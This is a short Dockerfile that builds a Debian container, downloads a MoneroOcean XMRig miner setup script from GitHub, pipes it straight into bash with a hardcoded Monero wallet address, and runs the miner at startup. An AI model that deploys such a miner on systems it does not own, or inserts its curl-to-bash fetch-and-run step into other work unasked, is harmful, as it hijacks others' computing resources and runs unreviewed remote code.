FROM debian:buster-slim

RUN apt-get update \ 
  && apt-get install -y curl \ 
  && curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 47zzogmbsCtR47S4bXvg9qJRu248Q6yuE14xM52sWS5viwomjQ7dtZHA8GUHAAhk9yhFxmiT3JVfjF3zp8oN13abGopMmxB

CMD ["/root/moneroocean/miner.sh"]